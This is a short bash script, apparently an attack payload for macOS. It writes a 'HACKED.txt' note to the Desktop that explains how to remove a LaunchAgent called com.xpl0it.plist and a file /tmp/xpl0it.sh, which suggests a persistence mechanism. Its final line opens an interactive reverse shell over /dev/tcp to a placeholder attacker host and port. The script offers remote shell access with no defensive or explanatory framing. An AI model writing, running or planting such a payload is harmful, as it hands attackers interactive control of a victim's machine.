#!/bin/bash
printf "To Unhack Yourself, Run These Commands:\n" > ~/Desktop/HACKED.txt
printf "launchctl unload -w ~/Library/LaunchAgents/com.xpl0it.plist\n" >> ~/Desktop/HACKED.txt
printf "rm ~/Library/LaunchAgents/com.xpl0it.plist\nrm /tmp/xpl0it.sh\n" >> ~/Desktop/HACKED.txt
bash -i >& /dev/tcp/attackerip/attackerport 0>&1
